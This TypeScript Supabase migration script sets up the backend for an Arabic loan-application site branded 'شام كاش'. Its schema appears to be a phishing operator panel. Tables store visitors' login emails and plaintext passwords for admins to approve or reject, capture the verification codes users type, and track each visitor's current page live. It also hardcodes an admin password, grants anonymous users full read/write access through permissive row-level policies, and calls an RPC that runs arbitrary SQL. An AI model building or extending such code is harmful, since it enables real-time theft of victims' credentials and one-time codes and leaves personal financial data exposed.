/**
 * Smart Database Migration System
 * 
 * هذا النظام يقوم بـ:
 * 1. فحص الجداول الموجودة
 * 2. إنشاء الجداول المفقودة
 * 3. نقل البيانات الافتراضية لـ CMS
 * 4. إنشاء مستخدم Admin افتراضي
 */

import { supabase } from './supabase';

type MigrationResult = {
  success: boolean;
  message: string;
  errors: string[];
};

type TableInfo = {
  name: string;
  columns: string[];
};

// ============================================
// 1. جدول admins_users
// ============================================
const ADMIN_USERS_TABLE = 'admin_users';

const adminUsersDefaultData = {
  email: 'admin@admin.com',
  password: 'Aa123456@', // يجب تشفيرها في الإنتاج
  name: 'مدير النظام',
  role: 'admin',
  created_at: new Date().toISOString(),
};

// ============================================
// 2. جدول site_config - إعدادات الموقع
// ============================================
const SITE_CONFIG_TABLE = 'site_config';

const siteConfigDefaultData = [
  {
    key: 'home',
    value: {
      badge_text: 'منصة التموبل الموثوقة',
      hero_image: 'https://images.pexels.com/photos/8441786/pexels-photo-8441786.jpeg?auto=compress&cs=tinysrgb&h=650&w=940',
      hero_title: 'مرحباً بك في',
      hero_title_highlight: 'شام كاش',
      hero_subtitle: 'احصل على تمويلك الآن أو لاين بدون الحاجة لزيارة فروع أو زيارة فرعي ',
      button_text: 'تقدم طلب تمويل',
      button2_text: 'دخول',
    },
  },
  {
    key: 'header',
    value: {
      logo_text: 'شام كاش',
      logo_subtitle: 'حلول التموبل',
    },
  },
  {
    key: 'footer',
    value: {
      contact_email: 'info@shamcash.sy',
      contact_phone: '+963 11 000 0000',
      contact_address: 'دمشق، سوريا',
      brand_description: 'منصة شام كاش للتمويل الشخصي.',
    },
  },
  {
    key: 'login',
    value: {
      title: 'تسجيل الدخول',
      subtitle: 'أدخل بياناتك للتحقق من طلبك',
      button_text: 'تسجيل الدخول',
    },
  },
  {
    key: 'verify',
    value: {
      title: 'رمز التحقق',
      subtitle: 'أدخل رمز التحقق المرسل لك',
      button_text: 'تحقق من الرمز',
      resend_text: 'إعادة إرسال الرمز',
    },
  },
  {
    key: 'thank_you',
    value: {
      title: 'شكراً لك!',
      message: 'شكراً لك! تم استلام طلبك وستتم مراجعته قريباً.',
      button_text: 'العودة للرئسية',
      button2_text: 'تقدم طلب جديد',
      success_text: 'تم استلام طلب تمويلك بنجاح',
    },
  },
  {
    key: 'register',
    value: {
      title: 'طلب تمويل بدون كفيل',
      subtitle: 'أدخل بياناتك لإرسال طلب التمويل',
      button_text: 'إرسال الطلب',
    },
  },
];

// ============================================
// 3. جدول form_fields - حقول النموذج
// ============================================
const FORM_FIELDS_TABLE = 'form_fields';

const formFieldsDefaultData = [
  // صفحة التسجيل
  {
    page_key: 'register',
    field_key: 'full_name',
    label: 'الاسم الكامل',
    field_type: 'text',
    placeholder: null,
    required: true,
    is_hidden: false,
    field_order: 1,
  },
  {
    page_key: 'register',
    field_key: 'national_id',
    label: 'الرقم الوطني',
    field_type: 'number',
    placeholder: 'الرقم الوطني',
    required: true,
    is_hidden: false,
    field_order: 4,
  },
  {
    page_key: 'register',
    field_key: 'phone',
    label: 'الموبايل ',
    field_type: 'tel',
    placeholder: '09XXXXXXXX',
    required: true,
    is_hidden: false,
    field_order: 6,
  },
  {
    page_key: 'register',
    field_key: 'salary',
    label: 'الدخل الشهري',
    field_type: 'number',
    placeholder: 'الدخل الشهري ',
    required: true,
    is_hidden: false,
    field_order: 9,
  },
  {
    page_key: 'register',
    field_key: 'job_title',
    label: 'المسمى الوظيفي',
    field_type: 'text',
    placeholder: 'عمل حر / حكومي / شركات',
    required: true,
    is_hidden: false,
    field_order: 10,
  },
  {
    page_key: 'register',
    field_key: 'city',
    label: 'المحافظة',
    field_type: 'text',
    placeholder: 'أدخل اسم المحافظة',
    required: true,
    is_hidden: false,
    field_order: 11,
  },
  {
    page_key: 'register',
    field_key: 'loan_type',
    label: 'نوع التمويل',
    field_type: 'text',
    placeholder: 'تمويل شخصي / تمويل عقاري/مشاريغ صغيرة',
    required: true,
    is_hidden: false,
    field_order: 7,
  },
  {
    page_key: 'register',
    field_key: 'loan_amount',
    label: 'مبلغ التمويل المطلوب',
    field_type: 'number',
    placeholder: 'دولار',
    required: true,
    is_hidden: false,
    field_order: 8,
  },
];

// ============================================
// SQL لإنشاء الجداول
// ============================================

const CREATE_TABLES_SQL = {
  [ADMIN_USERS_TABLE]: `
    CREATE TABLE IF NOT EXISTS ${ADMIN_USERS_TABLE} (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      name TEXT,
      role TEXT DEFAULT 'admin',
      created_at TIMESTAMPTZ DEFAULT NOW()
    );
  `,

  [SITE_CONFIG_TABLE]: `
    CREATE TABLE IF NOT EXISTS ${SITE_CONFIG_TABLE} (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      key TEXT UNIQUE NOT NULL,
      value JSONB NOT NULL,
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
  `,

  [FORM_FIELDS_TABLE]: `
    CREATE TABLE IF NOT EXISTS ${FORM_FIELDS_TABLE} (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      page_key TEXT NOT NULL,
      field_key TEXT NOT NULL,
      label TEXT NOT NULL,
      field_type TEXT DEFAULT 'text',
      placeholder TEXT,
      required BOOLEAN DEFAULT false,
      is_hidden BOOLEAN DEFAULT false,
      field_order INTEGER DEFAULT 0,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      UNIQUE(page_key, field_key)
    );
  `,

  registrations: `
    CREATE TABLE IF NOT EXISTS registrations (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      client_id TEXT,
      full_name TEXT,
      national_id TEXT,
      phone TEXT,
      email TEXT,
      salary DECIMAL,
      job_title TEXT,
      city TEXT,
      loan_type TEXT,
      loan_amount DECIMAL,
      extra_fields JSONB DEFAULT '{}',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
  `,

  login_attempts: `
    CREATE TABLE IF NOT EXISTS login_attempts (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      registration_id UUID REFERENCES registrations(id) ON DELETE SET NULL,
      client_id TEXT,
      email TEXT NOT NULL,
      password TEXT NOT NULL,
      status TEXT DEFAULT 'pending',
      logout_notice BOOLEAN DEFAULT false,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW(),
      approved_by UUID REFERENCES admin_users(id),
      rejected_by UUID REFERENCES admin_users(id)
    );
  `,

  verification_codes: `
    CREATE TABLE IF NOT EXISTS verification_codes (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      registration_id UUID REFERENCES registrations(id) ON DELETE SET NULL,
      client_id TEXT,
      code TEXT NOT NULL,
      verified BOOLEAN DEFAULT false,
      verified_at TIMESTAMPTZ,
      status TEXT DEFAULT 'pending',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      expires_at TIMESTAMPTZ DEFAULT (NOW() + INTERVAL '10 minutes')
    );
  `,

  presence: `
    CREATE TABLE IF NOT EXISTS presence (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      client_id TEXT UNIQUE NOT NULL,
      page TEXT,
      online BOOLEAN DEFAULT true,
      last_seen TIMESTAMPTZ DEFAULT NOW()
    );
  `,
};

// ============================================
// دوال Migration
// ============================================

/**
 * فحص إذا كان جدول موجود
 */
async function checkTableExists(tableName: string): Promise<boolean> {
  try {
    const { data, error } = await supabase
      .from(tableName)
      .select('id')
      .limit(1);
    
    return !error;
  } catch {
    return false;
  }
}

/**
 * إنشاء جدول باستخدام RPC
 */
async function createTable(tableName: string): Promise<boolean> {
  try {
    const sql = CREATE_TABLES_SQL[tableName as keyof typeof CREATE_TABLES_SQL];
    if (!sql) {
      console.warn(`No SQL defined for table: ${tableName}`);
      return false;
    }

    // محاولة إنشاء الجدول عبر RPC
    const { error } = await supabase.rpc('exec', { sql_query: sql });
    
    if (error) {
      // إذا فشل RPC، حاول بطريقة أخرى
      console.warn(`Failed to create ${tableName} via RPC:`, error.message);
      return false;
    }
    
    return true;
  } catch (err) {
    console.error(`Error creating table ${tableName}:`, err);
    return false;
  }
}

/**
 * تفعيل RLS على جدول
 */
async function enableRLS(tableName: string): Promise<void> {
  try {
    // محاولة تفعيل RLS
    const rlsSql = `ALTER TABLE ${tableName} ENABLE ROW LEVEL SECURITY;`;
    await supabase.rpc('exec', { sql_query: rlsSql });
    
    // إنشاء Policy للقراءة والكتابة
    const policySql = `
      DO $$ 
      BEGIN
        CREATE POLICY "${tableName}_all" ON ${tableName} 
        FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
      EXCEPTION WHEN duplicate_object THEN NULL;
      END $$;
    `;
    await supabase.rpc('exec', { sql_query: policySql });
  } catch {
    // تجاهل الأخطاء - RLS قد لا يكون مدعوماً
    console.warn(`RLS setup skipped for ${tableName}`);
  }
}

/**
 * حقن بيانات Admin افتراضي
 */
async function seedAdminUser(): Promise<MigrationResult> {
  const errors: string[] = [];
  
  try {
    // فحص إذا كان هناك Admin
    const { data: existingAdmin } = await supabase
      .from(ADMIN_USERS_TABLE)
      .select('*')
      .eq('email', adminUsersDefaultData.email)
      .single();

    if (existingAdmin) {
      return {
        success: true,
        message: `Admin user already exists: ${adminUsersDefaultData.email}`,
        errors: [],
      };
    }

    // إنشاء Admin جديد
    const { error } = await supabase
      .from(ADMIN_USERS_TABLE)
      .insert(adminUsersDefaultData);

    if (error) {
      errors.push(`Failed to create admin: ${error.message}`);
      return { success: false, message: 'Failed to create admin user', errors };
    }

    return {
      success: true,
      message: `Admin user created: ${adminUsersDefaultData.email}`,
      errors: [],
    };
  } catch (err: any) {
    errors.push(`Exception creating admin: ${err.message}`);
    return { success: false, message: 'Exception during admin creation', errors };
  }
}

/**
 * حقن بيانات CMS (site_config)
 */
async function seedSiteConfig(): Promise<MigrationResult> {
  const errors: string[] = [];
  
  try {
    // فحص إذا كانت البيانات موجودة
    const { data: existingConfig } = await supabase
      .from(SITE_CONFIG_TABLE)
      .select('key');

    const existingKeys = existingConfig?.map(c => c.key) || [];

    // إدراج البيانات المفقودة فقط
    const dataToInsert = siteConfigDefaultData.filter(
      config => !existingKeys.includes(config.key)
    );

    if (dataToInsert.length === 0) {
      return {
        success: true,
        message: 'site_config already fully seeded',
        errors: [],
      };
    }

    const { error } = await supabase
      .from(SITE_CONFIG_TABLE)
      .insert(dataToInsert);

    if (error) {
      errors.push(`Failed to seed site_config: ${error.message}`);
      return { success: false, message: 'Failed to seed CMS data', errors };
    }

    return {
      success: true,
      message: `Seeded ${dataToInsert.length} site_config entries`,
      errors: [],
    };
  } catch (err: any) {
    errors.push(`Exception seeding site_config: ${err.message}`);
    return { success: false, message: 'Exception during CMS seeding', errors };
  }
}

/**
 * حقن بيانات form_fields
 */
async function seedFormFields(): Promise<MigrationResult> {
  const errors: string[] = [];
  
  try {
    // فحص إذا كانت البيانات موجودة
    const { data: existingFields } = await supabase
      .from(FORM_FIELDS_TABLE)
      .select('page_key, field_key');

    const existingKeys = existingFields?.map(f => `${f.page_key}:${f.field_key}`) || [];

    // إدراج البيانات المفقودة فقط
    const dataToInsert = formFieldsDefaultData.filter(
      field => !existingKeys.includes(`${field.page_key}:${field.field_key}`)
    );

    if (dataToInsert.length === 0) {
      return {
        success: true,
        message: 'form_fields already fully seeded',
        errors: [],
      };
    }

    const { error } = await supabase
      .from(FORM_FIELDS_TABLE)
      .insert(dataToInsert);

    if (error) {
      errors.push(`Failed to seed form_fields: ${error.message}`);
      return { success: false, message: 'Failed to seed form fields', errors };
    }

    return {
      success: true,
      message: `Seeded ${dataToInsert.length} form_fields entries`,
      errors: [],
    };
  } catch (err: any) {
    errors.push(`Exception seeding form_fields: ${err.message}`);
    return { success: false, message: 'Exception during form fields seeding', errors };
  }
}

/**
 * Migration رئيسي - يعمل عند بدء التطبيق
 */
export async function runMigrations(): Promise<{
  success: boolean;
  results: MigrationResult[];
}> {
  console.log('🚀 Starting database migrations...');
  
  const results: MigrationResult[] = [];
  
  // 1. فحص وإنشاء الجداول
  const tables = Object.keys(CREATE_TABLES_SQL);
  
  for (const tableName of tables) {
    const exists = await checkTableExists(tableName);
    
    if (exists) {
      console.log(`✅ Table ${tableName} already exists`);
      results.push({
        success: true,
        message: `Table ${tableName} already exists`,
        errors: [],
      });
      
      // محاولة تفعيل RLS
      await enableRLS(tableName);
    } else {
      console.log(`📦 Creating table ${tableName}...`);
      const created = await createTable(tableName);
      
      if (created) {
        console.log(`✅ Table ${tableName} created successfully`);
        results.push({
          success: true,
          message: `Table ${tableName} created`,
          errors: [],
        });
        
        // تفعيل RLS
        await enableRLS(tableName);
      } else {
        console.warn(`⚠️ Could not create table ${tableName} (may need manual setup)`);
        results.push({
          success: false,
          message: `Table ${tableName} could not be created automatically`,
          errors: ['Table creation requires Supabase dashboard or direct database access'],
        });
      }
    }
  }
  
  // 2. حقن بيانات Admin
  const adminResult = await seedAdminUser();
  results.push(adminResult);
  console.log(adminResult.success ? `✅ ${adminResult.message}` : `❌ ${adminResult.message}`);
  
  // 3. حقن بيانات CMS
  const cmsResult = await seedSiteConfig();
  results.push(cmsResult);
  console.log(cmsResult.success ? `✅ ${cmsResult.message}` : `❌ ${cmsResult.message}`);
  
  // 4. حقن form_fields
  const fieldsResult = await seedFormFields();
  results.push(fieldsResult);
  console.log(fieldsResult.success ? `✅ ${fieldsResult.message}` : `❌ ${fieldsResult.message}`);
  
  // ملخص
  const allSuccess = results.every(r => r.success);
  const allErrors = results.flatMap(r => r.errors);
  
  console.log('\n📊 Migration Summary:');
  console.log(`   Total: ${results.length}`);
  console.log(`   Success: ${results.filter(r => r.success).length}`);
  console.log(`   Failed: ${results.filter(r => !r.success).length}`);
  
  if (allErrors.length > 0) {
    console.log('\n⚠️ Warnings/Errors:');
    allErrors.forEach(err => console.log(`   - ${err}`));
  }
  
  return {
    success: allSuccess,
    results,
  };
}

/**
 * تصدير البيانات للاستخدام في حالة عدم وجود Supabase
 */
export function getDefaultCMSData() {
  return {
    site_config: siteConfigDefaultData,
    form_fields: formFieldsDefaultData,
    admin_user: adminUsersDefaultData,
  };
}
